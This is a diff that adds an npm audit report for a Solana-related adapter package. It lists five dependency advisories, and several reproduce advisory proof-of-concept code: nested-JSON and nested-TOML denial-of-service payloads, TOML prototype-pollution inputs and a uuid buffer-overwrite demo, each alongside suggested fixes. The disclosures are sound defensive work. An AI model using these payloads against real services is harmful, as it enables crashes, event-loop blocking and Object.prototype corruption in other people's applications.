@@ -1,0 +1,215 @@
+{
+  "actions": [],
+  "advisories": {
+    "1103747": {
+      "findings": [
+        {
+          "version": "1.1.5",
+          "paths": [
+            "packages__adapter-meteora-dbc>@meteora-ag/cp-amm-sdk>@solana/spl-token>@solana/buffer-layout-utils>bigint-buffer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-3194\n- https://security.snyk.io/vuln/SNYK-JS-BIGINTBUFFER-3364597\n- https://www.usenix.org/system/files/sec23fall-prepub-262_staicu.pdf\n- https://github.com/no2chem/bigint-buffer/blob/master/src/index.ts#L25\n- https://github.com/advisories/GHSA-3gc7-fjrx-p6mg",
+      "created": "2025-04-04T06:34:22.000Z",
+      "id": 1103747,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package bigint-buffer from 0.0.0 to 1.1.5 are vulnerable to Buffer Overflow in the toBigIntLE() function. Attackers can exploit this to crash the application.",
+      "reported_by": null,
+      "title": "bigint-buffer Vulnerable to Buffer Overflow via toBigIntLE() Function",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-3194"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "bigint-buffer",
+      "vulnerable_versions": "<=1.1.5",
+      "github_advisory_id": "GHSA-3gc7-fjrx-p6mg",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2025-04-04T18:23:46.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-120"
+      ],
+      "url": "https://github.com/advisories/GHSA-3gc7-fjrx-p6mg"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "8.3.2",
+          "paths": [
+            "packages__adapter-meteora-dbc>@solana/web3.js>jayson>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1164823": {
+      "findings": [
+        {
+          "version": "1.9.1",
+          "paths": [
+            "packages__adapter-meteora-dbc>@solana/web3.js>jayson>stream-json"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uhop/stream-json/security/advisories/GHSA-528h-pc64-c93x\n- https://github.com/uhop/stream-json/commit/a869fb98aaef9225556f49901a8f55954ff856e6\n- https://github.com/advisories/GHSA-528h-pc64-c93x",
+      "created": "2026-09-03T20:27:53.000Z",
+      "id": 1164823,
+      "npm_advisory_id": null,
+      "overview": "## Description\n\nThe path filters `pick`, `ignore`, `filter`, and `replace` — the library's headline \"surgical extraction\" feature — recompute the full path string from the nesting stack on **every checkable token**. Because the stack length equals the current nesting depth, and a checkable token is emitted at every level, processing a document of depth *D* costs **O(D²)**, not O(D).\n\nThis is triggered by document **structure (nesting depth), not byte volume**, so a tiny payload achieves outsized CPU cost, and it is the ordinary \"traverse until the filter matches\" path — including the exact README flagship example `pick({filter: 'data'})`. Any service that uses these filters to extract a field from an untrusted (or larger-than-memory) JSON body — the primary documented use case — can be made to block its event loop.\n\n### Affected code (v3.4.0)\n\n`src/core/filters/filter-base.js`:\n\n```js\n// L26-32 — string filter: rejoins the ENTIRE stack on every call\nconst stringFilter = (string, separator) => {\n  const stringWithSeparator = string + separator;\n  return stack => {\n    const path = stack.join(separator);              // O(depth) — every call\n    return path === string || path.startsWith(stringWithSeparator);\n  };\n};\n\n// L34-39 — regexp filter: same\nconst regExpFilter = (regExp, separator) => {\n  return stack => {\n    regExp.lastIndex = 0;\n    return regExp.test(stack.join(separator));       // O(depth) — every call\n  };\n};\n```\n\n```js\n// L194 — filter(stack, chunk) is invoked for EVERY checkable token while in the 'check' state\nconst action = checkableTokens[chunk.name] !== 1 ? nonCheckableAction : filter(stack, chunk) ? specialAction : defaultAction;\n```\n\n`stack` is pushed/popped on `startObject`/`startArray`/end (L239-250), so `stack.length === depth`. For a depth-*D* document that hasn't matched yet, `filter()` runs once per level and each call is O(depth) ⇒ **O(D²)** total.\n\n**Not affected:** the `streamArray`/`streamObject`/`streamValues` streamers use `asm.depth` (an O(1) getter), so they don't exhibit this. The issue is specific to `filter-base.js` recomputing the path string.\n\n## Proof of concept\n\n```\nnpm i stream-json@3.4.0\nnode poc-quadratic-dos.mjs\n```\n\n```js\nimport parserStream from 'stream-json';\nimport { pick } from 'stream-json/filters/pick.js';\nimport chain from 'stream-chain';\n\nfunction run(D) {\n  const doc = '{\"meta\":'.repeat(D) + '1' + '}'.repeat(D); // depth D, never matches \"data\"\n  return new Promise((resolve) => {\n    const t0 = process.hrtime.bigint();\n    const pipeline = chain([parserStream(), pick({ filter: 'data' })]);\n    pipeline.on('data', () => {});\n    pipeline.on('end', () => resolve({ D, bytes: doc.length, ms: Number(process.hrtime.bigint() - t0) / 1e6 }));\n    pipeline.write(doc); pipeline.end();\n  });\n}\nfor (const D of [5000, 10000, 20000, 40000]) {\n  const r = await run(D);\n  console.log(`D=${r.D}  bytes=${r.bytes}  ms=${Math.round(r.ms)}`);\n}\n```\n\nMeasured (Node v24, single core, clean `npm i stream-json@3.4.0`):\n\n```\nD=5000    bytes= 45001   ms=  160\nD=10000   bytes= 90001   ms=  603   (3.8x for 2x input  -> quadratic)\nD=20000   bytes=180001   ms= 2511   (4.2x)\nD=40000   bytes=360001   ms=11823   (4.7x)\n```\n\nA **~360 KB** body (pure nesting, no data) blocks the event loop for **~12 seconds**; extrapolating O(D²), ~1–2 MB reaches single-digit minutes of CPU on one request.\n\n## Impact\n\nRemote, unauthenticated denial of service against any application that runs untrusted JSON through `pick`/`ignore`/`filter`/`replace` with a string or RegExp filter — the documented primary use of the library. A small request pins a CPU core / blocks the Node event loop, degrading or halting the service.\n\n## Suggested fix\n\nMaintain the joined path incrementally instead of rejoining the whole stack per token:\n- On `startObject`/`startArray` push: append `separator + key` to a cached path string (and remember the pre-push length).\n- On end/pop: truncate the cached path back to the remembered length.\n- Filters test/`startsWith` against the cached string — O(1) amortized per token, making the whole traversal O(D).\n\nAlternatively expose/enforce a maximum nesting depth for the filter path check.\n\n## Resolution\n\nFixed in 3.5.0. The path filters now cap JSON nesting depth at 1024 by default and throw a RangeError beyond it; upgrading is enough. Opt out with `maxDepth: Infinity`.",
+      "reported_by": null,
+      "title": "stream-json: pick/ignore/filter/replace filters are O(depth²) on nested input — small crafted JSON blocks the event loop for seconds→minutes (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-71429"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "stream-json",
+      "vulnerable_versions": "<=3.4.0",
+      "github_advisory_id": "GHSA-528h-pc64-c93x",
+      "recommendation": "Upgrade to version 3.5.0 or later",
+      "patched_versions": ">=3.5.0",
+      "updated": "2026-09-03T20:27:54.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-528h-pc64-c93x"
+    },
+    "1164824": {
+      "findings": [
+        {
+          "version": "3.0.0",
+          "paths": [
+            "packages__adapter-meteora-dbc>@meteora-ag/cp-amm-sdk>@coral-xyz/anchor>toml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-82x6-q7mm-w9cf\n- https://github.com/BinaryMuse/toml-node/pull/72\n- https://github.com/BinaryMuse/toml-node/commit/967b8b06754f3ecd9863cea118dc50792a8c353f\n- https://github.com/advisories/GHSA-82x6-q7mm-w9cf",
+      "created": "2026-09-03T20:56:13.000Z",
+      "id": 1164824,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n\n`toml.parse()` crashes with an uncaught `RangeError: Maximum call stack size exceeded` when parsing deeply nested arrays or inline tables. The parser is generated by **Peggy 5.1.0** (a PEG parser generator) as a recursive-descent parser; the value rule mutually recurses with the array and inline-table rules with **no depth limit**, so nesting depth equal to the input depth exhausts Node's call stack.\n\nA small payload — a bare array nested a few thousand levels deep (**~5–6 KB**) — reliably crashes the process on a default Node.js configuration. `toml` has **~47 million monthly downloads**.\n\n---\n\n## Vulnerable Code\n\nThe parser is a **generated** recursive-descent parser (`lib/parser.js`, header: `// @generated by Peggy 5.1.0.`). The recursion sink is the mutual recursion between the `value`, `array`, and `inline_table` rule functions — none carry a depth counter:\n\n```javascript\n// lib/parser.js — peg$parsevalue() @ line 1008\nfunction peg$parsevalue() {\n  ...\n  s0 = peg$parsearray();          // line 1017  ← value → array\n  if (s0 === peg$FAILED) {\n    s0 = peg$parseinline_table(); // line 1019  ← value → inline_table\n  }\n  ...\n}\n\n// peg$parsearray() @ line 2879\nfunction peg$parsearray() {\n  ...\n  s3 = peg$parsevalue();          // line 2931  ← array element → value (back-edge)\n  ...\n}\n\n// peg$parseinline_table() @ line 3066 → peg$parseinline_table_entry() @ line 3239\nfunction peg$parseinline_table_entry() {\n  ...\n  s5 = peg$parsevalue();          // line 3266  ← inline-table value → value (back-edge)\n  ...\n}\n```\n\n**Recursion cycle** for `a=[[[ … ]]]` (bare nested arrays):\n\n```\ntoml.parse(src)\n  → peg$parsevalue()        # parser.js:1008\n      → peg$parsearray()     # parser.js:1017 / 2879\n          → peg$parsevalue() # parser.js:2931  ← back-edge, per nested element\n              → …            # depth == input nesting → RangeError, no guard\n```\n\nInline tables (`{arr=[ … ]}`, `{a={a= … }}`) reach the same cycle via `peg$parseinline_table` / `peg$parseinline_table_entry`. Because the parser is machine-generated, there is no hand-written function to patch; the fix belongs in the grammar (`src/toml.pegjs`) or in an input guard (see *Suggested Fix*).\n\n---\n\n## Confirmed PoC (toml 4.1.2, Node.js v24.16.0)\n\n**Setup:**\n\n```bash\nnpm install toml@4.1.2        # latest release; 4.1.1 and earlier are equally affected\n# Docker equivalent:\n# docker run --rm node:24 bash -c \"npm i -g toml >/dev/null 2>&1; node -e '<PoC below>'\"\n```\n\n**Reproduce** — save as `poc.js`, run `node poc.js`:\n\n```javascript\nconst toml = require('toml');\nconsole.log('version:', require('toml/package.json').version);  // 4.1.2\n\n// Smallest reliable payload: a bare array nested 3000 levels (~6 KB)\nlet x = '1';\nfor (let i = 0; i < 3000; i++) x = '[' + x + ']';\nconst payload = 'a=' + x;\nconsole.log('payload bytes:', payload.length);   // 6003\n\ntry {\n  toml.parse(payload);\n  console.log('no crash');\n} catch (e) {\n  console.log('CONFIRMED:', e.constructor.name + ':', e.message.slice(0, 40));\n  console.log('is RangeError?', e instanceof RangeError,          // true\n              '| is SyntaxError?', e instanceof SyntaxError);     // false\n}\n```\n\n**Expected output (vulnerable — actual run):**\n\n```\nversion: 4.1.2\npayload bytes: 6003\nCONFIRMED: RangeError: Maximum call stack size exceeded\nis RangeError? true | is SyntaxError? false\n```\n\n**Verified crash thresholds (fresh process, single parse, default Node 24 stack):**\n\n| Payload shape | Reliable crash depth | Payload size |\n|---------------|----------------------|--------------|\n| Bare nested array `a=[[ … ]]` | ≥ ~2,500 | **~5 KB** (6 KB at depth 3000, used above) |\n| Inline table `{arr=[ … ]}` | ≥ ~1,500 | ~12 KB |\n\n> **Note on the exact threshold:** the precise crashing depth is not perfectly deterministic — it shifts by a few hundred levels depending on V8 JIT state, Node version, platform, and any configured `--stack-size`. This is expected for a stack-overflow condition. A payload nested a few thousand levels deep (single-digit KB) crashes reliably across runs; the PoC above (depth 3000) leaves ample margin.\n\n---\n\n## Realistic Attack Scenario\n\n```javascript\n// Node.js service parsing user-supplied TOML config\nconst express = require('express');\nconst toml = require('toml');\nconst app = express();\napp.use(express.text({ type: 'application/toml', limit: '100kb' }));\n\napp.post('/config', (req, res) => {\n  try {\n    const config = toml.parse(req.body);   // ← RangeError on ~6 KB nested payload\n    res.json({ status: 'ok' });\n  } catch (e) {\n    // toml only throws a peg$SyntaxError (e.name === 'SyntaxError', with e.line/e.column)\n    // on malformed input. A RangeError has neither, so this guard rethrows it:\n    if (e.line != null) return res.status(400).json({ error: e.message });\n    throw e;                                // RangeError propagates → uncaught → worker down\n  }\n});\n```\n\nAn unauthenticated attacker POSTs a ~6 KB deeply nested body (well under the 100 KB limit). `toml.parse` overflows the stack and throws `RangeError`; any handler that only special-cases syntax errors rethrows it, taking down the request (and, depending on the server, the worker).\n\n> The package exports **only** `parse` (`Object.keys(require('toml'))` → `['parse']`); there is **no** `toml.SyntaxError`. Code written as `catch (e) { if (e instanceof toml.SyntaxError) … }` is itself broken (`instanceof undefined` throws), so applications generally cannot cleanly distinguish the DoS `RangeError` from a normal parse error.\n\n---\n\n## Impact\n\nAny Node.js application that calls `toml.parse()` on untrusted input is exposed to a remote, unauthenticated denial of service via a small (~5–6 KB) deeply nested payload. `toml.parse` is the package's only public API, and TOML is commonly parsed from user-supplied config/upload endpoints. With **~47 million monthly downloads** and **0 existing CVEs**, the exposure is broad.\n\n`RangeError` is a subclass of `Error` (not of the parser's `SyntaxError`), so it bypasses the usual \"is this a parse error?\" checks and propagates as an unexpected exception.\n\n---\n\n## Suggested Fix\n\nBecause `lib/parser.js` is generated, the fix should be applied at the grammar level and regenerated, or guarded at the entry point:\n\n**Option 1 — grammar-level depth guard (`src/toml.pegjs`), then re-run Peggy:**\n\n```javascript\n// In the grammar initializer:\n{ let depth = 0; const MAX_DEPTH = 500; }\n\n// Wrap the recursive `value` rule:\nvalue = &{ if (++depth > MAX_DEPTH) { error(\"TOML nesting too deep\"); } return true; }\n        v:(array / inline_table / ...) { depth--; return v; }\n```\n\n**Option 2 — entry-point guard in `index.js`** (reject pathological input before parsing):\n\n```javascript\nmodule.exports.parse = function (input) {\n  // cheap structural bound before the recursive parse\n  let depth = 0, max = 0;\n  for (const ch of input) {\n    if (ch === '[' || ch === '{') max = Math.max(max, ++depth);\n    else if (ch === ']' || ch === '}') depth--;\n  }\n  if (max > 500) throw new Error('TOML nesting depth exceeds limit (500)');\n  return realParse(input);\n};\n```\n\n**Immediate mitigation (users, verified):** bound untrusted input length **and** bracket-nesting depth before calling `toml.parse()`, e.g. reject payloads whose maximum `[`/`{` nesting exceeds a few hundred. A byte-length limit alone is insufficient (5 KB already crashes).\n\n---\n\n## Comparison with Related Vulnerabilities\n\nSame CWE-674 class as the recursion-DoS findings in the PyPI `toml` package (C055) and the YAML parsers (PyYAML GHSA-r9mm-j37c-pjwp, ruamel.yaml). The distinguishing detail here: the parser is **generated by Peggy**, so the recursion lives in `peg$parsevalue`/`peg$parsearray`/`peg$parseinline_table` and cannot be fixed by editing a hand-written function — the earlier draft of this report incorrectly showed hand-written `parseValue(tokens, index)` functions that do not exist in the package.",
+      "reported_by": null,
+      "title": "toml-node: Uncontrolled Recursion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77465"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "toml",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-82x6-q7mm-w9cf",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-09-03T20:56:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-82x6-q7mm-w9cf"
+    },
+    "1164825": {
+      "findings": [
+        {
+          "version": "3.0.0",
+          "paths": [
+            "packages__adapter-meteora-dbc>@meteora-ag/cp-amm-sdk>@coral-xyz/anchor>toml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j\n- https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44\n- https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463\n- https://github.com/advisories/GHSA-v5mp-jgw5-2x6j",
+      "created": "2026-09-03T20:55:32.000Z",
+      "id": 1164825,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`toml.parse()` writes attacker-controlled keys onto `Object.prototype`. The compiler protects the tables it builds by creating them with `Object.create(null)`, which neutralizes a direct `[__proto__]` table. An attacker bypasses that protection by routing a table path *through a scalar value* and into the real prototype chain: a path such as `a.b.y.__proto__.__proto__`, where `a.b.y` holds a number, resolves to `Object.prototype` and every subsequent key/value writes onto it.\n\nThe bypass succeeds because the compiler's duplicate-key guards track paths with keys that do not match the keys used during traversal. The tracking strings and the traversal strings **desynchronize**, so the guard that should reject descending through an existing scalar never fires.\n\n### Steps to reproduce\n\n1. Install the latest version and run the comma-desynchronization payload.\n\n   ```bash\n   npm install toml@4.1.1\n   ```\n\n   ```js\n   const toml = require(\"toml\");\n   delete Object.prototype.polluted;\n\n   toml.parse(`\n   [a.b]\n   y = 1\n   [a.b.y.__proto__.__proto__]\n   polluted = \"yes\"\n   `);\n\n   console.log(({}).polluted);   // -> \"yes\"\n   ```\n\n2. Observe that a freshly created object inherits the injected key, confirming `Object.prototype` was modified:\n\n   ```\n   yes\n   ```\n\n3. Confirm the prefix-clear variant reaches the same result:\n\n   ```js\n   toml.parse(`\n   aa = 1\n   [[a]]\n   [aa.__proto__.__proto__]\n   polluted = \"yes\"\n   `);\n   console.log(({}).polluted);   // -> \"yes\"\n   ```\n\nA nested gadget object is also injectable, not only scalar keys:\n\n```js\ntoml.parse(`\n[a.b]\ny = 1\n[a.b.y.__proto__.__proto__.code]\nval = \"arbitrary\"\n`);\nconsole.log(({}).code.val);     // -> \"arbitrary\"\n```\n\n### Technical details\n\nThe compiler builds the result tree in `lib/compiler.js`. Tables are created with a null prototype, so a direct `[__proto__]` table only sets an ordinary own property and does not pollute:\n\n```js\nvar data = Object.create(null);   // line 7 — root has no prototype\n// ...\ntarget[k] = Object.create(null);  // line 64 — intermediate tables, no prototype\n```\n\nThe defect is in `deepRef`, which resolves a table path by walking each key segment of the live object graph:\n\n```js\nfunction deepRef(start, keys, value, off) {        // lib/compiler.js:183\n  var traversedPath = \"\";\n  var ctx = start;\n  for (var i = 0; i < keys.length; i++) {\n    var key = keys[i];\n    traversedPath = traversedPath ? traversedPath + \".\" + key : key;\n    if (typeof ctx[key] === \"undefined\") {\n      if (i === keys.length - 1) { ctx[key] = value; }\n      else { ctx[key] = Object.create(null); }\n    } else if (i !== keys.length - 1 && valueAssignments.has(traversedPath)) {\n      genError(\"Cannot redefine existing key '\" + traversedPath + \"'.\", off);  // line 197 — the guard\n    }\n    ctx = ctx[key];                                // line 200 — follows __proto__ into the prototype chain\n    if (ctx instanceof Array && ctx.length && i < keys.length - 1) {\n      ctx = ctx[ctx.length - 1];\n    }\n  }\n  return ctx;\n}\n```\n\nTwo problems combine:\n\n**1. `deepRef` treats `__proto__` (and `constructor`, `prototype`) as ordinary traversable keys.** Line 200 executes `ctx = ctx[key]` for every segment with no reserved-key check. When traversal reaches a scalar value — for example the number `1` stored at `a.b.y` — the next two `__proto__` segments evaluate to `Number.prototype` and then `Object.prototype`. The null-prototype hardening covers only the *container tables* the compiler creates; it does not cover the *values* stored in them, and those values carry normal prototypes.\n\n**2. The guard on line 197 is defeated by a path-format desynchronization.** `currentPath` is assigned two incompatible types: `setPath` stores an **array** (`currentPath = path`, line 151) while `addTableArray` stores a **string** (`currentPath = quotedPath`, line 172). When `assign` later builds the path of a value, it concatenates that array with a string:\n\n```js\nvar fullPath = currentPath ? currentPath + \".\" + keys.join(\".\") : keys.join(\".\"); // line 77\nvalueAssignments.add(fullPath);                                                   // line 86\n```\n\nFor the table `[a.b]`, `currentPath` is the array `[\"a\",\"b\"]`, so `currentPath + \".\"` coerces it via `Array.toString()` to the **comma-joined** string `\"a,b\"`. The value `y = 1` is therefore recorded as `\"a,b.y\"`. But `deepRef`, walking the path `a.b.y.__proto__.__proto__`, builds `traversedPath` with dots and checks `valueAssignments.has(\"a.b.y\")`. The set contains `\"a,b.y\"`, not `\"a.b.y\"`, so the lookup misses and the guard never raises \"Cannot redefine existing key\". Traversal proceeds through the scalar `1` into `Object.prototype`.\n\nInstrumenting the tracking sets after parsing the payload confirms the mismatch:\n\n```\nassignedPaths    : [ \"a.b\", \"a,b.y\", \"a.b.y.__proto__.__proto__\", ... ]\nvalueAssignments : [ \"a,b.y\", ... ]\ndeepRef checks valueAssignments.has(\"a.b.y\")  ->  false   (recorded as \"a,b.y\")\n```\n\nA second route reaches the same state without the comma trick. A table array `[[a]]` triggers the prefix-clearing loop in `addTableArray`, which deletes tracking entries by string prefix and wipes the guard state before the `__proto__` descent:\n\n```js\nassignedPaths.forEach(function(p) {                 // lines 164-166\n  if (p.indexOf(quotedPath) === 0) assignedPaths.delete(p);\n});\nvalueAssignments.forEach(function(p) {              // lines 167-169\n  if (p.indexOf(quotedPath) === 0) valueAssignments.delete(p);\n});\n```\n\n### Impact\n\n- Any application that calls `toml.parse()` on a TOML document an attacker can influence — uploaded configuration, project manifests, multi-tenant settings, package metadata — allows the attacker to write arbitrary properties onto `Object.prototype`.\n- Injected properties become visible on every object in the process. Depending on application gadgets, this enables denial of service (corrupting properties the runtime relies on), logic and authorization bypass (overriding flags read from plain objects), and, with a suitable sink, remote code execution.\n- The blast radius is the whole Node.js process, not just the parsed result object.\n- `toml` reports roughly 14.8 million weekly downloads and around 1,340 dependents, so the transitive exposure is large. Dependents that pass `toml` as the engine to front-matter or configuration loaders inherit the issue.\n\n---\n\nCredit: Duy Bui / @[calif.io](http://calif.io/)",
+      "reported_by": null,
+      "title": "toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-63376"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "toml",
+      "vulnerable_versions": "<4.1.2",
+      "github_advisory_id": "GHSA-v5mp-jgw5-2x6j",
+      "recommendation": "Upgrade to version 4.1.2 or later",
+      "patched_versions": ">=4.1.2",
+      "updated": "2026-09-03T20:55:34.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-v5mp-jgw5-2x6j"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 2,
+      "high": 3,
+      "critical": 0
+    },
+    "dependencies": 145,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 145
+  }
+}
